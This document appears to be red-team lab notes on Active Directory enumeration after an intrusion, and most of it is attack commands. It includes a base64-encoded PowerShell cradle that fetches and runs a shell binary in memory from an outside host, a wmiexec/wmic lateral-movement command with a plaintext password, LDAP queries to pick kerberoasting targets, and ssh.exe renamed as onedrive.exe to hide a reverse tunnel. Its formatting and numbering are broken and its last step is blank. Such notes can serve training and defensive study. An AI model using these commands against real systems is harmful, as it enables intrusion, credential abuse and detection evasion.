# Advanced Enumeration

On the System:

1. `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`




2. Prepare to enumerate the IT domain using a subsequent shell, pull back the information to your device and document so you are situationally aware. To do this, prepare another download cradle for the `shell.exe` binary. In contrast to the previous cradle, this will be used to download and invoke the shell in memory. Use the following command to base64 encode the cradle. 

```sh
echo 'try{[net.servicepointmanager]::servercertificatevalidationcallback={$true};[reflection.assembly]::load([net.webclient]::new().downloaddata("https://captainamerica.org/java/<path here>")).entrypoint.invoke(0,((,$null)));}catch{};'|iconv -f ASCII -t UTF-16LE -|base64 -w0 > cradle.txt

echo $(cat cradle.txt)
```


```shell 
> proxychains -q impacket-wmiexec -ts -debug -nooutput -silentcommand $DOMAIN/$USER:$PASSWORD@172.23.1.80 \
'c:\windows\system32\wbem\wmic.exe /node:172.23.3.110 /user:"it-nakatomi##.local\webadmin" /password:"Vr6F#x@9c2" /privileges:enable process call create "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -ex b -w h -enc  <paste here>"'



1. Now that we have fully interactive access in the PowerShell runspace, we will enumerate the IT domain for potential targets. To ensure the commands are executed under a Kerberos authenticated context, use the `[runas.program]` class pre-loaded into the bindshell. The convention for authenticated commands is `[runas.program]::netonly(("<domain>","<username>","<password>","<command>"))`. All other commands will be executed from the local context of the process. 
```

[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2","([adsisearcher]'(&(objectCategory=user))').findall()|convertto-json"));

[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2","([adsisearcher]'(&(objectCategory=Computer))').findall()|convertto-json"));
```
4. Previous enumeration reveals several domain users and computers with Service Principal Names (SPNs). To determine which accounts could be targeted for a kerberoasting attack, perform an LDAP query for all users assigned SPNs in order to generate a list of their SAM account names (this is needed later).  
```
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'[string[]]$sams=([adsisearcher]"(&(objectCategory=user)(serviceprincipalname=*))").findall()|%{$_.properties["samaccountname"]};$sams'));
```


<details><summary> OPTIONAL METHOD THAT IS MORE NOISY USING FULL SHELL</summary>

- 🎯 **Target:** it-user10

This will run through the merlin socks5 proxy, leveraging either schduled tasks or the regcmds in previous events.

1. First you want to enumerate, pull back the information to your device and document so you are situationally aware.
   
   ```ps1
    ([adsisearcher]"objectcategory=user").findall()
    ([adsisearcher]"objectcategory=computer").findall()
    ([adsisearcher]"serviceprincipalname=*").findall().properties.serviceprincipalname
    (([adsisearcher]"serviceprincipalname=*").findall(),properties)|fl*
   ```
   
2. Now with the domain user, collect accounts with SPNs.
 
    ```ps1
    $search = New-Object DirectoryServices.DirectorySearcher([ADSI]"") 
    $search.filter = "(&(servicePrincipalName=*)(objectCategory=user))" 
    $results = $search.Findall() 
    foreach ($results in $results) { $u = $results.GetDirectoryEntry(); $u.name; $u.samaccountname; foreach ($s in $u.servicePrincipalName) { $s; } Write-Host "---";}
    ```

## Proxy Based Domain Enumeration:

6to4 proxy: Creates A rule.

or SSH Reverse Proxy. 

In a console: 
1. copy c:\Windows\system32\openssh\ssh.exe C:\ProgramData\onedrive.exe
2. C:\ProgramData\onedrive.exe <tunnel commands>
3. 



